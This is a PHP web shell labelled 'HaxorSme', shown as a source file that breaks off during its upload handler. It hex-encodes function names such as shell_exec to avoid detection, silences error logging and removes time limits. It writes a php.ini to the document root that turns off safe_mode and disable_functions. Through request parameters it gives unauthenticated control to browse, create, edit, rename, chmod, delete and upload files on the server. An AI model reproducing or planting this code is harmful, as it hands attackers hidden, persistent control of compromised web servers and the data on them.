<?php

/**
 * HaxorSme
 **/

$a = [
    "7068705F756E616D65", 
    "73657373696F6E5F7374617274", 
    "6572726F725F7265706F7274696E67", 
    "70687076657273696F6E", 
    "66696C655F7075745F636F6E74656E7473", 
    "66696C655F6765745F636F6E74656E7473", 
    "66696C657065726D73", 
    "66696C656D74696D65", 
    "66696C6574797065", 
    "68746D6C7370656369616C6368617273", 
    "737072696E7466", 
    "737562737472", 
    "676574637764", 
    "6368646972", 
    "7374725F7265706C616365", 
    "6578706C6F6465", 
    "666C617368", 
    "6D6F76655F75706C6F616465645F66696C65", 
    "7363616E646972", 
    "676574686F737462796E616D65", 
    "7368656C6C5F65786563", 
    "53797374656D20496E666F726D6174696F6E", 
    "6469726E616D65", 
    "64617465", 
    "6D696D655F636F6E74656E745F74797065", 
    "66756E6374696F6E5F657869737473", 
    "6673697A65", 
    "726D646972", 
    "756E6C696E6B", 
    "6D6B646972", 
    "72656E616D65", 
    "7365745F74696D655F6C696D6974", 
    "636C656172737461746361636865", 
    "696E695F736574", 
    "696E695F676574", 
    "6765744F776E6572", 
    "6765745F63757272656E745F75736572"
];

for ($i = 0; $i < count($a); $i++) {
  $f[$i] = hex($a[$i]);
}

$f[1]();
$f ;
$f ;
@$f[32]();
@$f[33]('error_log', null);
@$f[33]('log_errors', 0);
@$f[33]('max_execution_time', 0);
@$f[33]('output_buffering', 0);
@$f[33]('display_errors', 0);

$r0 = $_SERVER['DOCUMENT_ROOT'];

// php.ini Auto Create
$b0 = fopen($r0.'/php.ini', 'w');
fwrite($b0, "safe_mode = OFF\ndisable_functions = NONE");
fclose($b0);

$ds = @$f[34]("disable_functions");
$ds0 = (!empty($ds)) ? "$ds" : "All function is accessible";

function fsize($file) {
  $a = ["B", "KB", "MB", "GB", "TB", "PB"];
  $pos = 0;
  $size = filesize($file);
  while ($size >= 1024) {
    $size /= 1024;
    $pos++;
  }
  return round($size, 2)." ".$a[$pos];
}

function hex($str) {
  $r = "";
  $len = (strlen($str) - 1);
  for ($i = 0; $i < $len; $i += 2) {
    $r .= chr(hexdec($str[$i].$str[$i + 1]));
  }
  return $r;
}

function flash($message, $status, $class, $redirect = false) {
  if (!empty($_SESSION["message"])) {
    unset($_SESSION["message"]);
  }
  if (!empty($_SESSION["class"])) {
    unset($_SESSION["class"]);
  }
  if (!empty($_SESSION["status"])) {
    unset($_SESSION["status"]);
  }
  $_SESSION["message"] = $message;
  $_SESSION["class"] = $class;
  $_SESSION["status"] = $status;
  if ($redirect) {
    header('Location: ' . $redirect);
    exit();
  }
  return true;
}

function clear() {
  if (!empty($_SESSION["message"])) {
    unset($_SESSION["message"]);
  }
  if (!empty($_SESSION["class"])) {
    unset($_SESSION["class"]);
  }
  if (!empty($_SESSION["status"])) {
    unset($_SESSION["status"]);
  }
  return true;
}

if (isset($_GET['dir'])) {
  $path = $_GET['dir'];
  $f[13]($_GET['dir']);
} else {
  $path = $f[12]();
}

$path = $f[14]('\\', '/', $path);
$exdir = $f[15]('/', $path);

function getOwner($item) {
  if (function_exists("posix_getpwuid")) {
    $downer = @posix_getpwuid(fileowner($item));
    $downer = $downer['name'];
  } else {
    $downer = fileowner($item);
  }
  if (function_exists("posix_getgrgid")) {
    $dgrp = @posix_getgrgid(filegroup($item));
    $dgrp = $dgrp['name'];
  } else {
    $dgrp = filegroup($item);
  }
  return $downer . '/' . $dgrp;
}

if (isset($_POST['newFolderName'])) {
  if ($f[29]($path . '/' . $_POST['newFolderName'])) {
    $f[16]("Create Folder Successfully!", "Success", "success", "?dir=$path");
  } else {
    $f[16]("Create Folder Failed", "Failed", "error", "?dir=$path");
  }
}
if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
  if ($f[4]($_POST['newFileName'], $_POST['newFileContent'])) {
    $f[16]("Create File Successfully!", "Success", "success", "?dir=$path");
  } else {
    $f[16]("Create File Failed", "Failed", "error", "?dir=$path");
  }
}

if (isset($_POST['newName']) && isset($_GET['item'])) {
  if ($_POST['newName'] == '') {
    $f[16]("You miss an important value", "Ooopss..", "warning", "?dir=$path");
  }
  if ($f[30]($path. '/'. $_GET['item'], $_POST['newName'])) {
    $f[16]("Rename Successfully!", "Success", "success", "?dir=$path");
  } else {
    $f[16]("Rename Failed", "Failed", "error", "?dir=$path");
  }
}
if (isset($_POST['newContent']) && isset($_GET['item'])) {
  if ($f[4]($path. '/'. $_GET['item'], $_POST['newContent'])) {
    $f[16]("Edit Successfully!", "Success", "success", "?dir=$path");
  } else {
    $f[16]("Edit Failed", "Failed", "error", "?dir=$path");
  }
}
if (isset($_POST['newPerm']) && isset($_GET['item'])) {
  if ($_POST['newPerm'] == '') {
    $f[16]("You miss an important value", "Ooopss..", "warning", "?dir=$path");
  }
  if (chmod($path. '/'. $_GET['item'], $_POST['newPerm'])) {
    $f[16]("Change Permission Successfully!", "Success", "success", "?dir=$path");
  } else {
    $f[16]("Change Permission", "Failed", "error", "?dir=$path");
  }
}
if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item'])) {
  if (is_dir($_GET['item'])) {
    if ($f[27]($_GET['item'])) {
      $f[16]("Delete Successfully!", "Success", "success", "?dir=$path");
    } else {
      $f[16]("Delete Failed", "Failed", "error", "?dir=$path");
    }
  } else {
    if ($f[28]($_GET['item'])) {
      $f[16]("Delete Successfully!", "Success", "success", "?dir=$path");
    } else {
      $f[16]("Delete Failed", "Failed", "error", "?dir=$path");
    }
  }
}
if (isset($_FILES['uploadfile'])) {
  $total = count($_FILES['uploadfile']['name']);
  for ($i = 0; $i < $total; $i++) {
    $mainupload = $f[17]($_FILES['uploadfile']['tmp
